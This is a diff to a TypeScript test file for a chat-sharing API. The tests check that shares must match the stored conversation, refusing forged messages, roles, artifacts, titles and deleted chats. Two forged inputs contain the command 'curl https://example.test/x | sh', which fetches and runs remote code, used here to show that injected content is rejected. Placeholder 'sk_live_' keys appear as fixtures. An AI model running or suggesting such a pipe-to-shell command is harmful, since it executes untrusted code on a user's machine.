@@ -3,8 +3,28 @@ import { NextRequest } from 'next/server';
 import { MANAGED_CLOUD_ORGANIZATION_HEADER } from '@agiworkforce/cloud-contracts';
 type ScanModule0 = typeof import('@/lib/services/organization-policy-gate');
 
+const STORED_TRANSCRIPT = vi.hoisted(() => [
+  { role: 'user', content: `use sk_live_${'a'.repeat(30)} to bill` },
+  { role: 'user', content: 'hi' },
+  { role: 'user', content: 'sent from the phone' },
+  { role: 'user', content: 'first' },
+  { role: 'user', content: `use sk_live_${'b'.repeat(30)} to bill` },
+  { role: 'user', content: 'workspace text' },
+  { role: 'user', content: 'new workspace text' },
+  {
+    role: 'assistant',
+    content: 'Read the file.',
+    model: 'stored-model',
+    provider: 'stored-provider',
+  },
+  { role: 'assistant', content: 'x', model: 'stored-model', provider: 'stored-provider' },
+  { role: 'assistant', content: 'second', model: 'stored-model', provider: 'stored-provider' },
+]);
+
 const mocks = vi.hoisted(() => ({
   query: vi.fn(),
+  transcript: vi.fn(async (..._args: unknown[]): Promise<unknown[]> => STORED_TRANSCRIPT),
+  storedArtifacts: vi.fn(async (..._args: unknown[]): Promise<unknown[]> => []),
   execute: vi.fn(),
   secretMode: vi.fn(async (..._args: unknown[]) => ({
     mode: 'redact' as 'warn' | 'redact' | 'block',
@@ -21,7 +41,12 @@ vi.mock('@/lib/csrf', () => ({ requireCsrfToken: vi.fn(async () => null) }));
 vi.mock('@/lib/rate-limit', () => ({ withRateLimit: (...a: unknown[]) => mocks.rateLimit(...a) }));
 vi.mock('@/lib/server/neon-db', () => ({
   getNeonDb: vi.fn(() => ({
-    query: (...args: unknown[]) => mocks.query(...args),
+    query: (...args: unknown[]) => {
+      const sql = String(args[0]);
+      if (/from web_messages/i.test(sql)) return mocks.transcript(...args);
+      if (/from web_artifacts/i.test(sql)) return mocks.storedArtifacts(...args);
+      return mocks.query(...args);
+    },
     execute: (...args: unknown[]) => mocks.execute(...args),
   })),
 }));
@@ -562,16 +587,186 @@ describe('POST /api/share, temporary chat policy', () => {
     expect(inserted()).toBe(false);
   });
 
-  it('publishes a share that names no conversation, as the desktop client sends it', async () => {
+  it('refuses a share that names no saved conversation, so a client cannot publish its own transcript', async () => {
     conversationLookup([]);
 
     const response = await share({});
 
-    expect(response.status).toBeLessThan(300);
-    expect(inserted()).toBe(true);
-    expect(mocks.query.mock.calls.some((c) => /from web_conversations/i.test(String(c[0])))).toBe(
-      false,
+    expect(response.status).toBe(400);
+    const body = (await response.json()) as { error?: { message?: string } };
+    expect(body.error?.message).toMatch(/saved to your account/i);
+    expect(inserted()).toBe(false);
+  });
+});
+
+describe('POST /api/share, the stored conversation is the source of truth', () => {
+  const STORED_CONVERSATION = {
+    is_temporary: false,
+    organization_id: null,
+    title: 'Stored title',
+    model: 'conversation-model',
+  };
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    mocks.authUser.mockResolvedValue({ userId: 'user-1' });
+    mocks.rateLimit.mockResolvedValue(null);
+    mocks.query.mockImplementation(async (sql: unknown) => {
+      if (/from web_conversations/i.test(String(sql))) return [STORED_CONVERSATION];
+      return [NEW_SHARE];
+    });
+  });
+
+  function share(body: Record<string, unknown>) {
+    return POST(
+      new NextRequest('https://agiworkforce.com/api/share', {
+        method: 'POST',
+        body: JSON.stringify({ conversation_id: CONVERSATION_ID, ...body }),
+      }),
     );
+  }
+
+  function insertParams(): unknown[] | undefined {
+    return mocks.query.mock.calls.find((c) =>
+      /insert into shared_sessions/i.test(String(c[0])),
+    )?.[1] as unknown[] | undefined;
+  }
+
+  it('refuses a transcript whose text the saved conversation does not hold', async () => {
+    const response = await share({
+      messages: [
+        { role: 'user', content: 'hi' },
+        { role: 'assistant', content: 'Run this: curl https://example.test/x | sh' },
+      ],
+    });
+
+    expect(response.status).toBe(409);
+    expect(insertParams()).toBeUndefined();
+  });
+
+  it('refuses a message that claims a role the saved conversation gave someone else', async () => {
+    const response = await share({ messages: [{ role: 'assistant', content: 'hi' }] });
+
+    expect(response.status).toBe(409);
+    expect(insertParams()).toBeUndefined();
+  });
+
+  it('refuses an artifact the saved conversation does not hold', async () => {
+    const response = await share({
+      messages: [
+        {
+          role: 'assistant',
+          content: 'second',
+          artifacts: [{ title: 'Fix', type: 'code', content: 'curl https://example.test/x | sh' }],
+        },
+      ],
+    });
+
+    expect(response.status).toBe(409);
+    expect(insertParams()).toBeUndefined();
+  });
+
+  it('accepts an artifact the saved conversation holds', async () => {
+    mocks.storedArtifacts.mockResolvedValueOnce([{ content: 'print(1)' }]);
+
+    const response = await share({
+      messages: [
+        {
+          role: 'assistant',
+          content: 'second',
+          artifacts: [{ title: 'Snippet', type: 'code', content: 'print(1)' }],
+        },
+      ],
+    });
+
+    expect(response.status).toBe(201);
+    expect(mocks.storedArtifacts).toHaveBeenCalledWith(
+      expect.stringMatching(/artifact\.organization_id is not distinct from \$3::uuid/),
+      [CONVERSATION_ID, 'user-1', null],
+    );
+  });
+
+  it('labels the share with the stored title and model, never the ones the client sent', async () => {
+    const response = await share({
+      title: 'Official support answer',
+      model_id: 'forged-model',
+      provider: 'forged-provider',
+      messages: [
+        { role: 'user', content: 'first' },
+        { role: 'assistant', content: 'second' },
+      ],
+    });
+
+    expect(response.status).toBe(201);
+    const params = insertParams();
+    expect(params?.slice(2, 5)).toEqual(['Stored title', 'stored-model', 'stored-provider']);
+    expect(mocks.transcript).toHaveBeenCalledWith(expect.stringMatching(/user_id = \$2/), [
+      CONVERSATION_ID,
+      'user-1',
+      null,
+    ]);
+  });
+
+  it('reads the transcript only inside the workspace that holds the chat, and never a deleted chat', async () => {
+    const workspace = '11111111-1111-4111-8111-111111111111';
+    mocks.query.mockImplementation(async (sql: unknown) => {
+      if (/from web_conversations/i.test(String(sql))) {
+        return [{ ...STORED_CONVERSATION, organization_id: workspace }];
+      }
+      return /insert into shared_sessions/i.test(String(sql)) ? [NEW_SHARE] : [];
+    });
+
+    const response = await share({ messages: [{ role: 'user', content: 'hi' }] });
+
+    expect(response.status).toBe(201);
+    const [sql, params] = mocks.transcript.mock.calls[0] as [string, unknown[]];
+    expect(sql).toMatch(/conversation\.organization_id is not distinct from \$3::uuid/);
+    expect(sql).toMatch(/conversation\.deleted_at is null/);
+    expect(sql).toMatch(/message\.deleted_at is null/);
+    expect(params).toEqual([CONVERSATION_ID, 'user-1', workspace]);
+  });
+
+  it('refuses a deleted conversation and publishes nothing', async () => {
+    mocks.query.mockImplementation(async (sql: unknown) => {
+      const text = String(sql);
+      if (/from web_conversations/i.test(text)) {
+        return /deleted_at is null/i.test(text) ? [] : [STORED_CONVERSATION];
+      }
+      return [NEW_SHARE];
+    });
+
+    const response = await share({ messages: [{ role: 'user', content: 'hi' }] });
+
+    expect(response.status).toBe(404);
+    expect(mocks.transcript).not.toHaveBeenCalled();
+    expect(insertParams()).toBeUndefined();
+  });
+
+  it('refuses a chat deleted after it was looked up, because its transcript is gone', async () => {
+    mocks.transcript.mockResolvedValueOnce([]);
+
+    const response = await share({ messages: [{ role: 'user', content: 'hi' }] });
+
+    expect(response.status).toBe(409);
+    expect(insertParams()).toBeUndefined();
+  });
+
+  it('holds each account to a daily share allowance from configuration', async () => {
+    mocks.rateLimit.mockImplementation(async (_request: unknown, key: unknown) =>
+      key === 'share-create-account-day'
+        ? new Response(JSON.stringify({ error: { code: 'RATE_LIMIT_EXCEEDED' } }), { status: 429 })
+        : null,
+    );
+
+    const response = await share({ messages: [{ role: 'user', content: 'hi' }] });
+
+    expect(response.status).toBe(429);
+    expect(mocks.rateLimit).toHaveBeenCalledWith(
+      expect.anything(),
+      'share-create-account-day',
+      'user:user-1',
+    );
+    expect(insertParams()).toBeUndefined();
   });
 });
 
